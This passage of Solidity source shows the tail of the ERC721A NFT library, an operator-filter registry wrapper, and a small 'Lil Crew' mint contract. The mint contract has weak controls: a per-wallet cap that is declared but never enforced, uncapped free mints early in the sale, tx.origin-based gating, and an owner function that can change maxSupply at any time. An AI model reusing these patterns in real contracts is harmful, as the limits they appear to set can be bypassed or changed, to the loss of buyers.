1032      *
1033      * Returns whether the call correctly returned the expected magic value.
1034      */
1035     function _checkContractOnERC721Received(
1036         address from,
1037         address to,
1038         uint256 tokenId,
1039         bytes memory _data
1040     ) private returns (bool) {
1041         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1042             bytes4 retval
1043         ) {
1044             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1045         } catch (bytes memory reason) {
1046             if (reason.length == 0) {
1047                 revert TransferToNonERC721ReceiverImplementer();
1048             } else {
1049                 assembly {
1050                     revert(add(32, reason), mload(reason))
1051                 }
1052             }
1053         }
1054     }
1055 
1056     // =============================================================
1057     //                        MINT OPERATIONS
1058     // =============================================================
1059 
1060     /**
1061      * @dev Mints `quantity` tokens and transfers them to `to`.
1062      *
1063      * Requirements:
1064      *
1065      * - `to` cannot be the zero address.
1066      * - `quantity` must be greater than 0.
1067      *
1068      * Emits a {Transfer} event for each mint.
1069      */
1070     function _mint(address to, uint256 quantity) internal virtual {
1071         uint256 startTokenId = _currentIndex;
1072         if (quantity == 0) revert MintZeroQuantity();
1073 
1074         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1075 
1076         // Overflows are incredibly unrealistic.
1077         // `balance` and `numberMinted` have a maximum limit of 2**64.
1078         // `tokenId` has a maximum limit of 2**256.
1079         unchecked {
1080             // Updates:
1081             // - `balance += quantity`.
1082             // - `numberMinted += quantity`.
1083             //
1084             // We can directly add to the `balance` and `numberMinted`.
1085             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1086 
1087             // Updates:
1088             // - `address` to the owner.
1089             // - `startTimestamp` to the timestamp of minting.
1090             // - `burned` to `false`.
1091             // - `nextInitialized` to `quantity == 1`.
1092             _packedOwnerships[startTokenId] = _packOwnershipData(
1093                 to,
1094                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1095             );
1096 
1097             uint256 toMasked;
1098             uint256 end = startTokenId + quantity;
1099 
1100             // Use assembly to loop and emit the `Transfer` event for gas savings.
1101             // The duplicated `log4` removes an extra check and reduces stack juggling.
1102             // The assembly, together with the surrounding Solidity code, have been
1103             // delicately arranged to nudge the compiler into producing optimized opcodes.
1104             assembly {
1105                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1106                 toMasked := and(to, _BITMASK_ADDRESS)
1107                 // Emit the `Transfer` event.
1108                 log4(
1109                     0, // Start of data (0, since no data).
1110                     0, // End of data (0, since no data).
1111                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1112                     0, // `address(0)`.
1113                     toMasked, // `to`.
1114                     startTokenId // `tokenId`.
1115                 )
1116 
1117                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1118                 // that overflows uint256 will make the loop run out of gas.
1119                 // The compiler will optimize the `iszero` away for performance.
1120                 for {
1121                     let tokenId := add(startTokenId, 1)
1122                 } iszero(eq(tokenId, end)) {
1123                     tokenId := add(tokenId, 1)
1124                 } {
1125                     // Emit the `Transfer` event. Similar to above.
1126                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1127                 }
1128             }
1129             if (toMasked == 0) revert MintToZeroAddress();
1130 
1131             _currentIndex = end;
1132         }
1133         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1134     }
1135 
1136     /**
1137      * @dev Mints `quantity` tokens and transfers them to `to`.
1138      *
1139      * This function is intended for efficient minting only during contract creation.
1140      *
1141      * It emits only one {ConsecutiveTransfer} as defined in
1142      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1143      * instead of a sequence of {Transfer} event(s).
1144      *
1145      * Calling this function outside of contract creation WILL make your contract
1146      * non-compliant with the ERC721 standard.
1147      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1148      * {ConsecutiveTransfer} event is only permissible during contract creation.
1149      *
1150      * Requirements:
1151      *
1152      * - `to` cannot be the zero address.
1153      * - `quantity` must be greater than 0.
1154      *
1155      * Emits a {ConsecutiveTransfer} event.
1156      */
1157     function _mintERC2309(address to, uint256 quantity) internal virtual {
1158         uint256 startTokenId = _currentIndex;
1159         if (to == address(0)) revert MintToZeroAddress();
1160         if (quantity == 0) revert MintZeroQuantity();
1161         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1162 
1163         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1164 
1165         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1166         unchecked {
1167             // Updates:
1168             // - `balance += quantity`.
1169             // - `numberMinted += quantity`.
1170             //
1171             // We can directly add to the `balance` and `numberMinted`.
1172             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1173 
1174             // Updates:
1175             // - `address` to the owner.
1176             // - `startTimestamp` to the timestamp of minting.
1177             // - `burned` to `false`.
1178             // - `nextInitialized` to `quantity == 1`.
1179             _packedOwnerships[startTokenId] = _packOwnershipData(
1180                 to,
1181                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1182             );
1183 
1184             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1185 
1186             _currentIndex = startTokenId + quantity;
1187         }
1188         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1189     }
1190 
1191     /**
1192      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1193      *
1194      * Requirements:
1195      *
1196      * - If `to` refers to a smart contract, it must implement
1197      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1198      * - `quantity` must be greater than 0.
1199      *
1200      * See {_mint}.
1201      *
1202      * Emits a {Transfer} event for each mint.
1203      */
1204     function _safeMint(
1205         address to,
1206         uint256 quantity,
1207         bytes memory _data
1208     ) internal virtual {
1209         _mint(to, quantity);
1210 
1211         unchecked {
1212             if (to.code.length != 0) {
1213                 uint256 end = _currentIndex;
1214                 uint256 index = end - quantity;
1215                 do {
1216                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1217                         revert TransferToNonERC721ReceiverImplementer();
1218                     }
1219                 } while (index < end);
1220                 // Reentrancy protection.
1221                 if (_currentIndex != end) revert();
1222             }
1223         }
1224     }
1225 
1226     /**
1227      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1228      */
1229     function _safeMint(address to, uint256 quantity) internal virtual {
1230         _safeMint(to, quantity, '');
1231     }
1232 
1233     // =============================================================
1234     //                        BURN OPERATIONS
1235     // =============================================================
1236 
1237     /**
1238      * @dev Equivalent to `_burn(tokenId, false)`.
1239      */
1240     function _burn(uint256 tokenId) internal virtual {
1241         _burn(tokenId, false);
1242     }
1243 
1244     /**
1245      * @dev Destroys `tokenId`.
1246      * The approval is cleared when the token is burned.
1247      *
1248      * Requirements:
1249      *
1250      * - `tokenId` must exist.
1251      *
1252      * Emits a {Transfer} event.
1253      */
1254     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1255         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1256 
1257         address from = address(uint160(prevOwnershipPacked));
1258 
1259         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1260 
1261         if (approvalCheck) {
1262             // The nested ifs save around 20+ gas over a compound boolean condition.
1263             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1264                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1265         }
1266 
1267         _beforeTokenTransfers(from, address(0), tokenId, 1);
1268 
1269         // Clear approvals from the previous owner.
1270         assembly {
1271             if approvedAddress {
1272                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1273                 sstore(approvedAddressSlot, 0)
1274             }
1275         }
1276 
1277         // Underflow of the sender's balance is impossible because we check for
1278         // ownership above and the recipient's balance can't realistically overflow.
1279         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1280         unchecked {
1281             // Updates:
1282             // - `balance -= 1`.
1283             // - `numberBurned += 1`.
1284             //
1285             // We can directly decrement the balance, and increment the number burned.
1286             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1287             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1288 
1289             // Updates:
1290             // - `address` to the last owner.
1291             // - `startTimestamp` to the timestamp of burning.
1292             // - `burned` to `true`.
1293             // - `nextInitialized` to `true`.
1294             _packedOwnerships[tokenId] = _packOwnershipData(
1295                 from,
1296                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1297             );
1298 
1299             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1300             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1301                 uint256 nextTokenId = tokenId + 1;
1302                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1303                 if (_packedOwnerships[nextTokenId] == 0) {
1304                     // If the next slot is within bounds.
1305                     if (nextTokenId != _currentIndex) {
1306                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1307                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1308                     }
1309                 }
1310             }
1311         }
1312 
1313         emit Transfer(from, address(0), tokenId);
1314         _afterTokenTransfers(from, address(0), tokenId, 1);
1315 
1316         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1317         unchecked {
1318             _burnCounter++;
1319         }
1320     }
1321 
1322     // =============================================================
1323     //                     EXTRA DATA OPERATIONS
1324     // =============================================================
1325 
1326     /**
1327      * @dev Directly sets the extra data for the ownership data `index`.
1328      */
1329     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1330         uint256 packed = _packedOwnerships[index];
1331         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1332         uint256 extraDataCasted;
1333         // Cast `extraData` with assembly to avoid redundant masking.
1334         assembly {
1335             extraDataCasted := extraData
1336         }
1337         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1338         _packedOwnerships[index] = packed;
1339     }
1340 
1341     /**
1342      * @dev Called during each token transfer to set the 24bit `extraData` field.
1343      * Intended to be overridden by the cosumer contract.
1344      *
1345      * `previousExtraData` - the value of `extraData` before transfer.
1346      *
1347      * Calling conditions:
1348      *
1349      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1350      * transferred to `to`.
1351      * - When `from` is zero, `tokenId` will be minted for `to`.
1352      * - When `to` is zero, `tokenId` will be burned by `from`.
1353      * - `from` and `to` are never both zero.
1354      */
1355     function _extraData(
1356         address from,
1357         address to,
1358         uint24 previousExtraData
1359     ) internal view virtual returns (uint24) {}
1360 
1361     /**
1362      * @dev Returns the next extra data for the packed ownership data.
1363      * The returned result is shifted into position.
1364      */
1365     function _nextExtraData(
1366         address from,
1367         address to,
1368         uint256 prevOwnershipPacked
1369     ) private view returns (uint256) {
1370         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1371         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1372     }
1373 
1374     // =============================================================
1375     //                       OTHER OPERATIONS
1376     // =============================================================
1377 
1378     /**
1379      * @dev Returns the message sender (defaults to `msg.sender`).
1380      *
1381      * If you are writing GSN compatible contracts, you need to override this function.
1382      */
1383     function _msgSenderERC721A() internal view virtual returns (address) {
1384         return msg.sender;
1385     }
1386 
1387     /**
1388      * @dev Converts a uint256 to its ASCII string decimal representation.
1389      */
1390     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1391         assembly {
1392             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1393             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1394             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1395             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1396             let m := add(mload(0x40), 0xa0)
1397             // Update the free memory pointer to allocate.
1398             mstore(0x40, m)
1399             // Assign the `str` to the end.
1400             str := sub(m, 0x20)
1401             // Zeroize the slot after the string.
1402             mstore(str, 0)
1403 
1404             // Cache the end of the memory to calculate the length later.
1405             let end := str
1406 
1407             // We write the string from rightmost digit to leftmost digit.
1408             // The following is essentially a do-while loop that also handles the zero case.
1409             // prettier-ignore
1410             for { let temp := value } 1 {} {
1411                 str := sub(str, 1)
1412                 // Write the character to the pointer.
1413                 // The ASCII index of the '0' character is 48.
1414                 mstore8(str, add(48, mod(temp, 10)))
1415                 // Keep dividing `temp` until zero.
1416                 temp := div(temp, 10)
1417                 // prettier-ignore
1418                 if iszero(temp) { break }
1419             }
1420 
1421             let length := sub(end, str)
1422             // Move the pointer 32 bytes leftwards to make room for the length.
1423             str := sub(str, 0x20)
1424             // Store the length.
1425             mstore(str, length)
1426         }
1427     }
1428 }
1429 
1430 
1431 interface IOperatorFilterRegistry {
1432     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
1433     function register(address registrant) external;
1434     function registerAndSubscribe(address registrant, address subscription) external;
1435     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
1436     function unregister(address addr) external;
1437     function updateOperator(address registrant, address operator, bool filtered) external;
1438     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
1439     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
1440     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
1441     function subscribe(address registrant, address registrantToSubscribe) external;
1442     function unsubscribe(address registrant, bool copyExistingEntries) external;
1443     function subscriptionOf(address addr) external returns (address registrant);
1444     function subscribers(address registrant) external returns (address[] memory);
1445     function subscriberAt(address registrant, uint256 index) external returns (address);
1446     function copyEntriesOf(address registrant, address registrantToCopy) external;
1447     function isOperatorFiltered(address registrant, address operator) external returns (bool);
1448     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
1449     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
1450     function filteredOperators(address addr) external returns (address[] memory);
1451     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
1452     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
1453     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
1454     function isRegistered(address addr) external returns (bool);
1455     function codeHashOf(address addr) external returns (bytes32);
1456 }
1457 
1458 
1459 /**
1460  * @title  OperatorFilterer
1461  * @notice Abstract contract whose constructor automatically registers and optionally subscribes to or copies another
1462  *         registrant's entries in the OperatorFilterRegistry.
1463  * @dev    This smart contract is meant to be inherited by token contracts so they can use the following:
1464  *         - `onlyAllowedOperator` modifier for `transferFrom` and `safeTransferFrom` methods.
1465  *         - `onlyAllowedOperatorApproval` modifier for `approve` and `setApprovalForAll` methods.
1466  */
1467 abstract contract OperatorFilterer {
1468     error OperatorNotAllowed(address operator);
1469 
1470     IOperatorFilterRegistry public constant OPERATOR_FILTER_REGISTRY =
1471         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
1472 
1473     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
1474         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
1475         // will not revert, but the contract will need to be registered with the registry once it is deployed in
1476         // order for the modifier to filter addresses.
1477         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1478             if (subscribe) {
1479                 OPERATOR_FILTER_REGISTRY.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
1480             } else {
1481                 if (subscriptionOrRegistrantToCopy != address(0)) {
1482                     OPERATOR_FILTER_REGISTRY.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
1483                 } else {
1484                     OPERATOR_FILTER_REGISTRY.register(address(this));
1485                 }
1486             }
1487         }
1488     }
1489 
1490     modifier onlyAllowedOperator(address from) virtual {
1491         // Check registry code length to facilitate testing in environments without a deployed registry.
1492         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1493             // Allow spending tokens from addresses with balance
1494             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
1495             // from an EOA.
1496             if (from == msg.sender) {
1497                 _;
1498                 return;
1499             }
1500             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), msg.sender)) {
1501                 revert OperatorNotAllowed(msg.sender);
1502             }
1503         }
1504         _;
1505     }
1506 
1507     modifier onlyAllowedOperatorApproval(address operator) virtual {
1508         // Check registry code length to facilitate testing in environments without a deployed registry.
1509         if (address(OPERATOR_FILTER_REGISTRY).code.length > 0) {
1510             if (!OPERATOR_FILTER_REGISTRY.isOperatorAllowed(address(this), operator)) {
1511                 revert OperatorNotAllowed(operator);
1512             }
1513         }
1514         _;
1515     }
1516 }
1517 
1518 /**
1519  * @title  DefaultOperatorFilterer
1520  * @notice Inherits from OperatorFilterer and automatically subscribes to the default OpenSea subscription.
1521  */
1522 abstract contract TheOperatorFilterer is OperatorFilterer {
1523     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
1524     address public owner;
1525 
1526     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
1527 }
1528 
1529 
1530 contract LilCrew is ERC721A, TheOperatorFilterer {
1531 
1532     string uri = "ipfs://bafybeibkkcrsuecafr53ec4cpsughosmmb5alhe23hfhjel6w5lkegeqgm/";
1533 
1534     uint256 public maxSupply = 400;
1535 
1536     uint256 public mintPrice = 0.002 ether;
1537 
1538     uint256 public maxFreeMintAmountPerTx = 1;
1539 
1540     uint256 public maxMintAmountPerWallet = 10;
1541 
1542     mapping(address => uint256) private _userForFree;
1543 
1544     mapping(uint256 => uint256) private _userMinted;
1545 
1546     function publicMint(uint256 amount) payable public {
1547         require(totalSupply() + amount <= maxSupply);
1548         _mint(amount);
1549     }
1550 
1551     function _mint(uint256 amount) internal {
1552         if (msg.value == 0) {
1553             require(amount == 1);
1554             if (totalSupply() > maxSupply / 5) {
1555                 require(_userMinted[block.number] < FreeNum() 
1556                 && _userForFree[tx.origin] < maxFreeMintAmountPerTx );
1557                 _userForFree[tx.origin]++;
1558                 _userMinted[block.number]++;
1559             }
1560             _safeMint(msg.sender, 1);
1561         } else {
1562             require(msg.value >= mintPrice * amount);
1563             _safeMint(msg.sender, amount);
1564         }
1565     }
1566 
1567     function reserve(address addr, uint256 amount) public onlyOwner {
1568         require(totalSupply() + amount <= maxSupply);
1569         _safeMint(addr, amount);
1570     }
1571     
1572     modifier onlyOwner {
1573         require(owner == msg.sender);
1574         _;
1575     }
1576 
1577     constructor() ERC721A("Lil Crew", "Lc") {
1578         owner = msg.sender;
1579         maxMintAmountPerWallet = 10;
1580     }
1581 
1582     function setURi(string memory u) public onlyOwner {
1583         uri = u;
1584     }
1585 
1586     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1587         return string(abi.encodePacked(uri, _toString(tokenId), ".json"));
1588     }
1589 
1590     function setFreePerAddr(uint256 maxTx, uint256 maxS) external onlyOwner {
1591         maxFreeMintAmountPerTx = maxTx;
1592         maxSupply = maxS;
1593     }
1594 
1595     function FreeNum() internal returns (uint256){
1596         return (maxSupply - totalSupply()) / 12;
1597     }
1598 
1599     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1600         uint256 royaltyAmount = (_salePrice * 50) / 1000;
1601         return (owner, royaltyAmount);
1602     }
1603 
1604     function withdraw() external onlyOwner {
1605         payable(msg.sender).transfer(address(this).balance);
1606     }
1607 
1608     function setApprovalForAll(address operator, bool approved) public override onlyAllowedOperatorApproval(operator) {
1609         super.setApprovalForAll(operator, approved);
1610     }
1611 
1612     function approve(address operator, uint256 tokenId) public payable override onlyAllowedOperatorApproval(operator) {
1613         super.approve(operator, tokenId);
1614     }
1615 
1616     function transferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1617         super.transferFrom(from, to, tokenId);
1618     }
1619 
1620     function safeTransferFrom(address from, address to, uint256 tokenId) public payable override onlyAllowedOperator(from) {
1621         super.safeTransferFrom(from, to, tokenId);
1622     }
1623 
1624     function safeTransferFrom(address from, address to, uint256 tokenId, bytes memory data)
1625         public
1626         payable
1627         override
1628         onlyAllowedOperator(from)
1629     {
1630         super.safeTransferFrom(from, to, tokenId, data);
1631     }
1632 }